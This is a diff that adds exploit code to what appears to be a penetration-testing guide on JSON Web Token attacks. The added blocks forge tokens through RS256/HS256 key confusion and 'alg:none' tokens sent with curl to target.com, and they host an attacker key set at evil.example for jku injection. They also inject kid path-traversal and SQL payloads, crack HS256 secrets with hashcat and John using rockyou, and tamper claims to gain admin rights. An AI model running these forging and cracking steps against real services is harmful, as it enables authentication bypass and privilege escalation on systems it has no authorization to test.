@@ -62,7 +62,17 @@ Each part is base64url-encoded (no padding, `-` and `_` instead of `+/`).
 
 **Header** — declares algorithm and optional metadata:
 
+```json
+{"alg":"RS256","typ":"JWT","kid":"key-2023-01"}
+```
+
+
 **Payload** — claims about the subject:
+
+```json
+{"sub":"8412","name":"Regular User","role":"user","iat":1719000000,"exp":1719003600}
+```
+
 
 **Signature** — `base64url(header).base64url(payload)` signed with the key declared in `alg`.
 
@@ -82,11 +92,44 @@ The most impactful JWT attack. When a server uses RS256 (asymmetric) but also ac
 
 1. Download the server's public key:
 
+```bash
+curl -s https://target.com/.well-known/jwks.json
+# or from a TLS cert:
+openssl s_client -connect target.com:443 -showcerts 2>/dev/null \
+  | openssl x509 -pubkey -noout > public.pem
+```
+
+
 2. Convert the public key to PEM if needed (JWKS uses JWK format):
+
+```javascript
+// node: npm i jwk-to-pem
+const jwkToPem = require('jwk-to-pem');
+const jwk = { kty:"RSA", n:"<modulus-base64url>", e:"AQAB" };
+console.log(jwkToPem(jwk, { private: false })); // writes PEM to stdout
+```
+
 
 3. Use jwt_tool to forge a token:
 
+```bash
+python3 jwt_tool.py "<original-jwt>" -X k -pk public.pem
+# -X k = key-confusion attack: signs HS256 using the RSA public key as the HMAC secret
+```
+
+
 4. Modify claims for privilege escalation:
+
+```python
+import jwt  # pip install pyjwt
+pubkey = open("public.pem", "rb").read()
+forged = jwt.encode(
+    {"sub": "8412", "role": "admin", "exp": 9999999999},
+    key=pubkey, algorithm="HS256"
+)
+print(forged)
+```
+
 
 5. Send the forged token and verify access escalation
 
@@ -112,6 +155,24 @@ Some libraries accept `alg: none` — no signature verification at all.
 4. Modify claims as needed
 5. Re-encode and send
 
+**Constructed `none` token (header + tampered payload + trailing dot, empty signature):**
+
+```bash
+python3 - <<'EOF'
+import base64, json
+def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=")
+hdr = b64u(json.dumps({"alg":"none","typ":"JWT"}).encode())
+pl  = b64u(json.dumps({"sub":"8412","role":"admin","exp":9999999999}).encode())
+print(f"{hdr}.{pl}.")   # trailing dot required
+EOF
+```
+
+```bash
+curl -s https://target.com/api/me -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI4NDEyIn0."
+```
+
+Repeat with header variants: `{"alg":"None"}`, `{"alg":"nOnE"}`, `{"alg":"NONE"}`, `{"alg":"null"}`.
+
 
 **Important:** The trailing dot is required — `header.payload.` not `header.payload`
 
@@ -130,6 +191,32 @@ If the server trusts these URLs without validation:
 5. Sign the token with your private key
 6. Server fetches your key and verifies your signature
 
+**Generate a key pair and host a JWKS:**
+
+```bash
+openssl genrsa -out evil.pem 2048
+openssl rsa -in evil.pem -pubout -out evil.pub.pem
+```
+
+```json
+{
+  "keys": [{
+    "kty": "RSA",
+    "kid": "attacker-key",
+    "use": "sig",
+    "alg": "RS256",
+    "n": "<base64url modulus of evil.pub.pem>",
+    "e": "AQAB"
+  }]
+}
+```
+
+```bash
+# Serve keys.json at https://evil.example/keys.json, then:
+python3 jwt_tool.py "<original-jwt>" -X a -u "https://evil.example/keys.json"
+```
+
+
 
 **Defense bypass:** Some servers only allow `jku` from the same origin. Test with:
 - Same-origin URL variations (`/../../../evil.com/keys.json`)
@@ -142,7 +229,30 @@ The `kid` (Key ID) header parameter tells the server which key to use. If the se
 
 **Null byte injection:**
 
+```json
+{"kid":"../../key%00.json"}
+{"kid":"key\u0000"}
+```
+
 **Path traversal:**
+
+```json
+{"kid":"../../../../dev/null"}
+{"kid":"../../../dev/cdrom"}
+```
+
+If the server reads `/dev/null` (empty file) as key material, sign with an empty secret:
+
+```python
+import jwt
+forged = jwt.encode(
+    {"sub": "8412", "role": "admin"},
+    key="", algorithm="HS256",
+    headers={"kid": "../../../../dev/null"}
+)
+print(forged)
+```
+
 
 **Why `/dev/null` works:** If the server reads `/dev/null` as the key file, it gets an empty key. You can then sign with an empty string.
 
@@ -151,13 +261,32 @@ The `kid` (Key ID) header parameter tells the server which key to use. If the se
 
 If the server uses `kid` in a SQL query without parameterization, classic SQL injection applies.
 
+```json
+{"kid":"x' UNION SELECT 'attacker-controlled-secret' AS secret FROM dual-- "}
+{"kid":"' UNION SELECT 'key'-- "}
+```
+
+Sign the forged token with the value your injection planted (`attacker-controlled-secret`) — the server looks up your injected string as the HMAC key and verifies successfully.
+
+
 ## 8. Weak Secret Brute Force
 
 If the algorithm is HS256, the signature is an HMAC with a shared secret. Brute force the secret:
 
 **Hashcat (GPU-accelerated):**
 
+```bash
+hashcat -a 0 -m 16500 "<jwt>" /usr/share/wordlists/rockyou.txt
+hashcat -a 3 -m 16500 "<jwt>" "?a?a?a?a?a?a?a?a"   # 8-char brute force
+```
+
 **John the Ripper:**
+
+```bash
+python3 /usr/share/john/jwt2john.py "<jwt>" > jwt.john
+john jwt.john --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
 
 **Common weak secrets to test manually:**
 - `secret`, `password`, `key`, `test`
@@ -166,6 +295,13 @@ If the algorithm is HS256, the signature is an HMAC with a shared secret. Brute 
 - Common JWT secrets from public lists
 
 **Custom wordlist generation:**
+
+```bash
+cewl -d 2 -w site-words.txt https://target.com/about
+# append app-specific candidates
+printf '%s\n' "$(echo -n '' | base64)" "targetname2024" "jwt_secret" >> site-words.txt
+```
+
 
 ## 9. Token Claim Manipulation
 
@@ -183,7 +319,29 @@ Modify specific claims to escalate privileges or bypass checks:
 
 **Technique:** Decode → modify → re-sign with same algorithm:
 
+```bash
+python3 - <<'EOF'
+import base64, json, jwt
+token = "<original-jwt>"
+h, p, s = token.split('.')
+pad = lambda x: x + "=" * (-len(x) % 4)
+claims = json.loads(base64.urlsafe_b64decode(pad(p)))
+claims["role"] = "admin"
+claims.pop("exp", None)
+# HS256 with the (cracked / default) secret:
+print(jwt.encode(claims, "secret", algorithm="HS256",
+                 headers={"alg":"HS256","typ":"JWT"}))
+EOF
+```
+
+
 **Nested claim attacks:** If claims are nested in arrays or objects, test for mass assignment:
+
+```json
+{"sub":"8412","role":"user","permissions":["read"],"isAdmin":true,
+ "scope":"read write admin","membership":{"tier":"enterprise","bypassPaywall":true}}
+```
+
 
 ## 10. Mixed-Case Bypass
 
